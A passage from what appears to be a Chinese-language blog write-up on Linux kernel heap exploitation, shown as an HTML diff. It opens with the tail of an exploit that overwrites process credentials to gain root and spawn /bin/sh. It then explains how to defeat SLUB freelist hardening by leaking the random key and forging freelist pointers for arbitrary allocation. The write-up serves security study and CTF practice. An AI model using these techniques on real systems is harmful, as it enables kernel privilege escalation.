class="line">idFork = fork();</span><br><span class="line"><span class="keyword">if</span>(idFork == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="comment">//get into 28*0 to set uid and gid 0</span></span><br><span class="line">    editFun(fd,<span class="number">0</span>,<span class="number">28</span>,credBuf);</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]welcome root:\n&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(idFork &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]fork fail\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h3 id="修改FD申请"   >
+          <a href="#修改FD申请" class="heading-link"><i class="fas fa-link"></i></a><a href="#修改FD申请" class="headerlink" title="修改FD申请"></a>修改FD申请</h3>
+      
+        <h4 id="1-HARDENED保护"   >
+          <a href="#1-HARDENED保护" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-HARDENED保护" class="headerlink" title="(1)HARDENED保护"></a>(1)HARDENED保护</h4>
+      <p>不过从4.14的内核版本开始，就存在<code>freelist_ptr</code>加密了，不过需要在编译内核的时候加入<code>CONFIG_SLAB_FREELIST_HARDENED</code>选项来启用，并且加密形式在不同版本不太一样。</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.14</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^ ptr_addr);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//v5.16</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">freelist_ptr</span><span class="params">(<span class="keyword">const</span> struct kmem_cache *s, <span class="keyword">void</span> *ptr,</span></span></span><br><span class="line"><span class="params"><span class="function">				 <span class="keyword">unsigned</span> <span class="keyword">long</span> ptr_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * When CONFIG_KASAN_SW/HW_TAGS is enabled, ptr_addr might be tagged.</span></span><br><span class="line"><span class="comment">	 * Normally, this doesn&#x27;t cause any issues, as both set_freepointer()</span></span><br><span class="line"><span class="comment">	 * and get_freepointer() are called with a pointer with the same tag.</span></span><br><span class="line"><span class="comment">	 * However, there are some issues with CONFIG_SLUB_DEBUG code. For</span></span><br><span class="line"><span class="comment">	 * example, when __free_slub() iterates over objects in a cache, it</span></span><br><span class="line"><span class="comment">	 * passes untagged pointers to check_object(). check_object() in turns</span></span><br><span class="line"><span class="comment">	 * calls get_freepointer() with an untagged pointer, which causes the</span></span><br><span class="line"><span class="comment">	 * freepointer to be restored incorrectly.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">void</span> *)((<span class="keyword">unsigned</span> <span class="keyword">long</span>)ptr ^ s-&gt;random ^</span><br><span class="line">			swab((<span class="keyword">unsigned</span> <span class="keyword">long</span>)kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr)));</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">	<span class="keyword">return</span> ptr;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>这里的<code>ptr</code>即当前释放的chunk地址，ptr_addr为指向下一个free_chunk的地址，所以中间相当于有一个random值不知道。这个值在<code>linux/slub_def.h</code>中被定义</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>
+
+<p>并且在<code>mm/slub.c</code>中的<code>kmem_cache_open</code>函数中被赋值</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kmem_cache_open</span><span class="params">(struct kmem_cache *s, <span class="keyword">slab_flags_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	s-&gt;flags = kmem_cache_flags(s-&gt;size, flags, s-&gt;name, s-&gt;ctor);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	s-&gt;random = get_random_long();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></div></figure>
+
+<p>参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://rtfingc.github.io/slub-freelist-hardened" >Slub Freelist Hardened (rtfingc.github.io)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>这里需要我们获得random的值，这个值保存在对于size的kmem_cache中，该结构体定义在<code>/linux/slub_def.h</code>中如下</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v4.17</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> __<span class="title">percpu</span> *<span class="title">cpu_slab</span>;</span></span><br><span class="line">	<span class="comment">/* Used for retriving partial slabs etc */</span></span><br><span class="line">	<span class="keyword">slab_flags_t</span> flags;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> min_partial;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> size;	<span class="comment">/* The size of an object including meta data */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> object_size;<span class="comment">/* The size of an object without meta data */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> offset;	<span class="comment">/* Free pointer offset. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="comment">/* Number of per cpu partial objects to keep around */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> cpu_partial;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">oo</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Allocation and freeing of slabs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">max</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_order_objects</span> <span class="title">min</span>;</span></span><br><span class="line">	<span class="keyword">gfp_t</span> allocflags;	<span class="comment">/* gfp flags to use on each alloc */</span></span><br><span class="line">	<span class="keyword">int</span> refcount;		<span class="comment">/* Refcount for slab cache destroy */</span></span><br><span class="line">	<span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> inuse;		<span class="comment">/* Offset to metadata */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> align;		<span class="comment">/* Alignment */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> reserved;		<span class="comment">/* Reserved bytes at the end of slabs */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> red_left_pad;	<span class="comment">/* Left redzone padding size */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *name;	<span class="comment">/* Name (only for display!) */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span>	<span class="comment">/* List of slab caches */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span>	<span class="comment">/* For sysfs */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">kobj_remove_work</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMCG</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">memcg_cache_params</span> <span class="title">memcg_params</span>;</span></span><br><span class="line">	<span class="comment">/* for propagation, maximum size of a stored attr */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> max_attr_size;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SYSFS</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kset</span> *<span class="title">memcg_kset</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> random;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Defragmentation by allocating from a remote node.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> remote_node_defrag_ratio;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset;	<span class="comment">/* Usercopy region offset */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> usersize;		<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>
+
+<p>并且不同size的kmem_cache对应的random不同。</p>
+<p>在有DEBUG信息的内核中，我们尝试寻找0x10大小的kmem_cache比如我们寻找0x10大小的就需要在保存所有kmem_cache的全局变量结构kmalloc_caches中寻找，不过需要注意的是，好像很多时候不是按照顺序来排布的，如下图，我们就需要寻找kmalloc-16，但是这里它的索引为4，而不是2，不知道为什么。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161521037.png" alt="image-20220116152127879"></p>
+<p>另外kmalloc_caches[0]并不是一个kmem_cache结构的，而是一个其他类型，暂时不知道用来干啥。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524450.png" alt="image-20220116152404345"></p>
+<p>那么回到正题，先寻找下random，这个就是0x10大小的kmem_cache中保存的random值了。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161524429.png" alt="image-20220116152450367"></p>
+<p>那么我们得到random值就可以算出下一个chunk在哪里了</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161527850.png" alt="image-20220116152702584"></p>
+<p>但是通常意义上如果开启了这个保护，我们是得不到堆地址的，最多得到保护之后的fd的值，没办法算出来random的值，但是由于是异或了当前堆地址ptr和堆地址+size(ptr_addr)，那么我们对size做文章，这样可以找出一些规律。</p>
+<p>参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259280#h3-15" >slub堆溢出的利用 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h5 id="🔺注：-1"   >
+          <a href="#🔺注：-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：-1" class="headerlink" title="🔺注："></a>🔺注：</h5>
+      <p>在该内核下的同一个size的kmem_cache的random值不管启动多少次都是固定的，无论有没有开启KASLR。（至少我在本地测的时候是如此的）</p>
+
+        <h6 id="未开启KASLR"   >
+          <a href="#未开启KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#未开启KASLR" class="headerlink" title="未开启KASLR"></a>未开启KASLR</h6>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243725.png" alt="image-20220118124309671"></p>
+
+        <h6 id="开启KASLR"   >
+          <a href="#开启KASLR" class="heading-link"><i class="fas fa-link"></i></a><a href="#开启KASLR" class="headerlink" title="开启KASLR"></a>开启KASLR</h6>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201181243644.png" alt="image-20220118124331545"></p>
+<p>可以看到都是一致的。</p>
+<p>但是放到题目中就不太确定了，就是将题目在本地运行测出来的random值和题目在远程运行测出来的random值是不是也是一样的呢，之前的西湖的easy_kernel题中貌似是一样的，但是我并没有实际测试，因为还没碰到..下回换个机器测试下。或者说和qemu还是环境cpu都有关系吗，期待大佬回答。</p>
+<p>而且在后面的<strong>新版的HARDENED</strong>中也有提到，加入swab运算之后，貌似会对random值再做一个低2个字节的处理，这个是怎么处理的呢，还是有点不太懂。</p>
+
+        <h5 id="①0x8为例"   >
+          <a href="#①0x8为例" class="heading-link"><i class="fas fa-link"></i></a><a href="#①0x8为例" class="headerlink" title="①0x8为例"></a>①0x8为例</h5>
+      <p>0x10对齐的堆块其fd均一样，取其fd直接异或0x8即可得到kmalloc-8的random值</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161703956.png" alt="image-20220116170303600"></p>
+<p>原因如下，0x10对齐的堆块异或其值+0x8并不会造成进位，所以异或得到的值都是一样的</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161707520.png" alt="image-20220116170714710"></p>
+
+        <h5 id="②0x10，0x20，0x30等等"   >
+          <a href="#②0x10，0x20，0x30等等" class="heading-link"><i class="fas fa-link"></i></a><a href="#②0x10，0x20，0x30等等" class="headerlink" title="②0x10，0x20，0x30等等"></a>②0x10，0x20，0x30等等</h5>
+      <p>这种类型的其fd和random值一般差半个字节，大不了直接爆破，1/16的概率</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161750717.png" alt="image-20220116175038466"></p>
+<p>并且观察可以发现，在0x10的情况下也会有重复的部分，同样的，该重复的部分异或0x10也会是random值</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161752331.png" alt="image-20220116175228263"></p>
+<p>具体的还是自己摸索或者看一只狗师傅的：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/259280#h3-16" >slub堆溢出的利用 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h5 id="泄露random"   >
+          <a href="#泄露random" class="heading-link"><i class="fas fa-link"></i></a><a href="#泄露random" class="headerlink" title="泄露random"></a>泄露random</h5>
+      <p>以下泄露Random样例也是参照一只狗师傅的</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Add(<span class="number">0</span>, <span class="number">0x100</span>);</span><br><span class="line">Add(<span class="number">1</span>, <span class="number">0x100</span>);</span><br><span class="line">Add(<span class="number">2</span>, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">Show(<span class="number">0</span>, &amp;FD1, <span class="number">8</span>);</span><br><span class="line">Show(<span class="number">1</span>, &amp;FD2, <span class="number">8</span>);</span><br><span class="line">Show(<span class="number">2</span>, &amp;FD3, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> random;</span><br><span class="line"><span class="keyword">if</span>(FD1==FD3)</span><br><span class="line">    random = FD1^<span class="number">0x100</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    random = FD2^<span class="number">0x100</span>;</span><br></pre></td></tr></table></div></figure>
+
+
+        <h5 id="获得堆地址任意写"   >
+          <a href="#获得堆地址任意写" class="heading-link"><i class="fas fa-link"></i></a><a href="#获得堆地址任意写" class="headerlink" title="获得堆地址任意写"></a>获得堆地址任意写</h5>
+      <p>但是获得堆地址不太好整，需要找到freelist的最后一个堆块last_chunk，然后其fd异或random即可得到该堆块的地址，获得堆块地址后，直接释放该堆块last_chunk，然后通过之前一个堆块pre_chunk溢出或者UAF，按照异或规则修改last_chunk的fd，就能实现任意申请了。</p>
+<p>以8192大小为例，申请到最后一个chunk时释放，然后再申请就能申请回来了。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161815160.png" alt="image-20220116181547997"></p>
+<p>注意获取堆地址的时候，由于不同size的kmem_cache的最大freelist数量差异较大，size越大的其freelist链表个数越少，越容易申请到最后一个。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201161744323.png" alt="image-20220116174436185"></p>
+
+        <h4 id="2-HARDENED新版改动"   >
+          <a href="#2-HARDENED新版改动" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-HARDENED新版改动" class="headerlink" title="(2)HARDENED新版改动"></a>(2)HARDENED新版改动</h4>
+      
+        <h5 id="kasan-reset-tag"   >
+          <a href="#kasan-reset-tag" class="heading-link"><i class="fas fa-link"></i></a><a href="#kasan-reset-tag" class="headerlink" title="kasan_reset_tag"></a>kasan_reset_tag</h5>
+      <p>从v5.0开始，加了一个新的东西</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr));</span><br></pre></td></tr></table></div></figure>
+
+<p>这个不知道用来干啥的，有点蒙圈</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//linux/kasan.h</span><br><span class="line">static inline void *kasan_reset_tag(const void *addr)</span><br><span class="line">&#123;</span><br><span class="line">	return (void *)addr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+
+
+
+        <h5 id="swab"   >
+          <a href="#swab" class="heading-link"><i class="fas fa-link"></i></a><a href="#swab" class="headerlink" title="swab"></a>swab</h5>
+      <p>从v5.6.4开始，又加了一个运算</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">swab(kasan_reset_tag((<span class="keyword">void</span> *)ptr_addr)));</span><br></pre></td></tr></table></div></figure>
+
+<p>本质上是大小端互换，比如</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> before = <span class="number">0xaabbccdd</span>;</span><br><span class="line"><span class="keyword">int</span> after = swab(before);</span><br><span class="line">after == <span class="number">0xddccbbaa</span>;</span><br></pre></td></tr></table></div></figure>
+
+<p>这个直接解，参照哪个师傅的来着，忘记了…..</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __u64 u_int64_t</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swab64(x) ((__u64)((((__u64)(x) &amp; (__u64)0x00000000000000ffULL) &lt;&lt; 56) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x000000000000ff00ULL) &lt;&lt; 40) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x0000000000ff0000ULL) &lt;&lt; 24) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x00000000ff000000ULL) &lt;&lt; 8)  | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x000000ff00000000ULL) &gt;&gt; 8)  | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x0000ff0000000000ULL) &gt;&gt; 24) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0x00ff000000000000ULL) &gt;&gt; 40) | \</span></span><br><span class="line"><span class="meta">        (((__u64)(x) &amp; (__u64)0xff00000000000000ULL) &gt;&gt; 56)))</span></span><br></pre></td></tr></table></div></figure>
+
+<p>然后又不知道从哪个版本开始，FD的存放位置发生改变，放在了chunk_addr+(size/2)的位置上，以0x80大小的chunk为例子(反正v5.0没有，v5.7有)</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202201171050239.png" alt="image-20220117105059115"></p>
+<p>此外计算方式也有点变化，ptr_addr不再是当前chunk的地址，而是FD的地址，同时还是会与上面的运算做一个简单的合并:</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD_addr == chunk_addr + size/<span class="number">2</span></span><br><span class="line">FD_value == random ^ swab(FD_addr) ^ next_chunk_addr</span><br></pre></td></tr></table></div></figure>
+
+<p>所以当我们本地把random值测出来之后，再依据freelist的最后一个直接改next_addr然后套入上述公式，获得FD值，将FD值写入即可完成上述任意堆块申请。（但是远程还没有试过，想来依据最近的easy_kernel中测出来的情况应该是random值也是不变的）</p>
+<p>同样的当位于freelist的最后一个chunk时，next_chunk_addr = 0，上述公式就变成如下</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD_addr == chunk_addr + size/<span class="number">2</span></span><br><span class="line">FD_value == random ^ swab(FD_addr)</span><br></pre></td></tr></table></div></figure>
+
+<p>进而可以测出FD_addr，得到chunk的地址。当然，前提是建立在远程的random值不会发生改变。</p>
+<p>如果远程的random值会发生改变的话，那么直接将当前FD_value异或需要劫持的fake_chunk_addr，那么一直将freelist申请完，之后再接着申请就能得到fake_chunk_addr。这种情况我们可以借助连续的两个FD_value中间4个字节是否发生改变来进行判断，如果改变了，那么代表freelist即将结束，这时候就可以进行修改了。不过修改之后，该size的<code>kmem_cache</code>的freelist链表就会损坏，要么重新修复，要么就申请其他size的<code>kmem_cache</code>。</p>
+<p>但是还有一个问题就是，如果开了下面的<code>RANDOM</code>保护，那么我们测出来的random值其实就不一定准确了，因为freelist中的chunk地址不是连续的，我们用连续的地址来测势必导致测出来的random值的低2个字节不同，这时候就需要申请到freelist的最后一个chunk，取得其FD值的低2个字节和我们之前测出来的random一合并就是最终的random值了。不过这个怎么判断是freelist的最后一个chunk也有点问题…</p>
+
+        <h5 id="double-free"   >
+          <a href="#double-free" class="heading-link"><i class="fas fa-link"></i></a><a href="#double-free" class="headerlink" title="double_free"></a>double_free</h5>
+      <p>在开启了HARDENED这种情况下，对于FD指针会添加一个检测</p>
+<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mm/slub.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">set_freepointer</span><span class="params">(struct kmem_cache *s, <span class="keyword">void</span> *object, <span class="keyword">void</span> *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> freeptr_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)object + s-&gt;offset;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span></span><br><span class="line">	BUG_ON(object == fp); <span class="comment">/* naive detection of double free or corruption */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	*(<span class="keyword">void</span> **)freeptr_addr = freelist_ptr(s, fp, freeptr_addr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>检测double_free，其实就相当于是fastbin中的double_free检测，检测freelist中的第一个和即将放进入freelist中的chunk是否相等。</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203082351317.png" alt="image-20220308235157003"></p>
